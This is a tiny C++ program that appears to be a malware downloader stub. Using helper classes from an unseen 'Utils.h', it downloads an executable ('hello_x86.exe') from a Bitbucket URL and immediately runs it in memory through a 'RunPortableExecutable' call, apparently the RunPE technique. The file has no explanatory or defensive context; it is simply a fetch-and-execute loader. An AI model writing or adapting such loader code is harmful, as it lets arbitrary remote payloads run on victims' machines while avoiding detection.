
#include "Utils.h"

int main(int argc, char *argv[])
{
	Internet inet;
	System sys;
	char* File = inet.GetFile("https://bitbucket.org/kent9876/hucci/downloads/hello_x86.exe");
	sys.RunPortableExecutable(File);

}